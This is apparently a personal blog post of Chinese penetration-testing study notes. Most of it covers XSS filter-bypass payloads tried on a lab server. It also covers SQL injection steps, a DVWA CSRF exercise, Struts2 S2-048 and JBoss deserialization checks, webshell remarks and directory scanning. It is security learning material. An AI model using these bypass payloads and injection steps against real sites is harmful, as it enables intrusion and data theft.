---
title: 安全-渗透学习-待整理
date: 2020-03-28 21:11:55
tags:
	- 安全
	- 杂
typora-root-url: ./

---

# 反射性XSS

**跨站脚本攻击(Cross Site Scripting)**。XSS分为**反射型XSS，存储型XSS和DOM型XSS**。反射型XXS是一种**非持久性**的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。

![10976729-63e28ea411ca8edc](/blog.github.io/images/10976729-63e28ea411ca8edc.jpg)

**XSS攻击分类:**

XSS漏洞一般有两种类型攻击。

a)一类是来自内部的攻击，主要指的是利用WEB程序自身的漏洞，提交特殊的字符串，从而使得跨站页面直接存在于被攻击站点上，这个字符串被称为跨站语句。这一类攻击所利用的漏洞非常类似于SQL Injection漏洞，都是WEB程序没有对用户输入作充分的检查和过滤。

b)另一类则是来来自外部的攻击，主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低。

**执行例子：**

1、未作任何校验的网站，输入恶意代码，弹出弹框：

`<script>alert('chenie')</script>`

![image-20200328165842263](/blog.github.io/images/image-20200328165842263.png)

2、加入了一些过滤，`preg_replace()`函数如果检测到`<script>`和`</script>`就会把其替换为空格(区分大小写，只替换小写的)。所以这里可以双写绕过也可以大小写绕过。即payload:

`<scr<script>ipt>alert('chenie')</s</script>cript>`

或

`<scRipt>alert('chenie')</scRipt>`都可以绕过过滤进行XSS。

3、用双写绕过

`<scr<script>ipt>alert('chenie')`

4、使用img标签来绕过,img src调用图片失败然后执行后面的动作。payload为:

`<img src=""onclick="alert('chenie')">`

5、用编码来绕过了, payload为

`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,99,104,101,110,105,101,39))</script>`

6、通过构造js脚本使标签闭合然后加入新标签,payload为

`</script><script>alert('chenie')</script>`

7、使用单引号绕过，尝试构造语句如下：

`';alert('chenie');'`

8、当测试提交一个地址的时候源码会显示出来一个链接，链接就是输入的链接，关键代码如上，payload为

`http://192.168.1.3:8080/xss3/xss/example8.php/[/url]"><script>alert('chenie')</script>"< "`

9、XSS直接在页面输出锚点id，构建一个带xss的锚点即可，payload为

`http://192.168.1.3:8080/xss3/xss/example9.php#alert(‘chenie’)</script)>`。

刷新网页后，即可弹窗



# 火狐配置

18个扩展让你的Firefox成为渗透测试工具                                

https://www.freebuf.com/sectool/11544.html?replytocom=52007

https://blog.csdn.net/qq_37865996/article/details/85564334

# sql注入

![image-20200401211603623](/blog.github.io/images/image-20200401211603623.png)

https://www.cnblogs.com/hzk001/p/12069553.html

# CSRF跨站请求伪造

![1539764806_5bc6f2465902f](/blog.github.io/images/1539764806_5bc6f2465902f.jpg)

解决及使用方法：

1、关闭标签，cookie要过期

2、dvwa中的使用，打开csrf页面，修改密码，复制网址，修改password，并在另一个tab页中执行，密码修改为后一个密码；退出登录后，再执行网址，修改不成功

https://www.mochoublog.com/study/246.html



# nmap

nmap是收集信息的第一步的使用工具

![d0c8a786c9177f3eb3256e8e814c6bc29e3d56ad](/blog.github.io/images/d0c8a786c9177f3eb3256e8e814c6bc29e3d56ad.png)



# sql注入

select first_name,surname from XXX where ID=‘1’;

1、先判断是否有注入点

2、判断是数字型还是字符型：输入'，报错，可以判断是字符型注入

3、通过order by  1,2,3 #，判断列数   ，#对后面的sql语句进行截断

4、通过union 进行联合查询，进行外显

5、MySQL 用select查表名  select table_name from information_schema.tables where table_schema='当前数据库'

 sql注入工具：**sqlmap**

**fiddler 抓包工具**



# Struts2 漏洞

## 漏洞编号

CVE-2017-9791

S2-048

## 安装环境

需要有war包struts2-showcase

下载官方地址：https://archive.apache.org/dist/struts/2.3.32/

2、将下载使用app中的war包，放到Apache Tomcat的C:\Tomcat 7.0\webapps目录下，重启服务即可使用

3、访问网址：http://locallhost:8080/struts2-showcase/integration/editGangster.action

4、判断漏洞是否存在：https://blog.csdn.net/qq1124794084/article/details/77891998?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5

输入${9/3}，查看是否被执行

## 漏洞影响

使用 Struts 1 plugin 和 Struts 1 action 的Struts 2.3.x

## 漏洞概述

Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。在Struts 2.3.x 系列的 Showcase 应用中演示Struts2整合Struts 1 的插件中存在一处任意代码执行漏洞。当你的应用使用了Struts2 Struts1的插件时，可能导致不受信任的输入传入到ActionMessage类中导致命令执行。

## 解决方案

1.不要启用Struts2-struts1-plugin插件；

2.不要使用showcase.war；

3.始终使用资源键，而不是将原始消息传递给ActionMessage，如下所示，而不要直接传递原始值：

```
messages.add("msg", new ActionMessage("struts1.gangsterAdded", gform.getName()));
```

而不是这样：

```
messages.add("msg", new ActionMessage("Gangster " + gform.getName() + " was added"));
```

# 测试过程中遇到的问题

1、使用工具测试时，请检查现在的环境配置是否正常

2、使用jar文件，前确定JDK已经安装

3、一般情况下，电脑文件后缀不要隐藏

# Jboss的java反序列漏洞

1、访问：XXX/invoker/readonly

2、页面出现：org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:102)

3、确定存在java反序列

4、使用工具，可以验证java反序列的危害

![image-20200504193832440](/blog.github.io/images/image-20200504193832440.png)

# 提权

网站的提权，依旧是一句话木马最为好用

需要注意的是，上传漏洞的利用，并不只是单纯的上传，还要考虑上传过程中的绕过问题

# 被Apache服务器解析成php文件

不管文件最后后缀为什么，只要是.php.*结尾，就会被Apache服务器解析成php文件

# [一文读懂Http Headers为何物(超详细)](https://segmentfault.com/a/1190000018234763)

我们打开chrome的network，点击任何一条request请求，即可发现，每个http headers都包含以下部分:Genaral，Request Headers，Response Headers，Request Payload。

General(不属于headers，只用于收集请求url和响应的status等信息)

Request Headers(请求headers)

Response Headers(响应headers)

Request Payload(请求参数)

1、Genaral headers: 同时适用于请求和响应消息，但与最终消息传输的数据无关的消息头。

2、Request Headers: 包含更多有关要获取的资源或客户端本身信息的消息头。

3、Response Headers：包含有关响应的补充信息，如其位置或服务器本身（名称和版本等）的消息头。

4、Entity Headers：包含有关实体主体的更多信息，比如主体长(Content-Length)度或其MIME类型。

![view](/blog.github.io/images/view)





# 御剑后台路径扫描

![image-20201022223645139](/blog.github.io/images/image-20201022223645139.png)

目录扫描：扫描站点的目录，寻找敏感文件（目录名、探针文件、后台、robots.txt【】、备份文件等）

目录：站点结构，权限控制不严格

探针文件：服务器配置信息，phpinfo.php  readme.txt  config.txt

后台：管理整个网站的入口，inurl:admin.php

robots.txt：一般存放在站点根目录，如果管理员对robos.txt文件不合理就会造成信息泄露。

备份文件：数据库备份、网站备份文件等 .bak  .zip  [www.rar](http://www.rar/)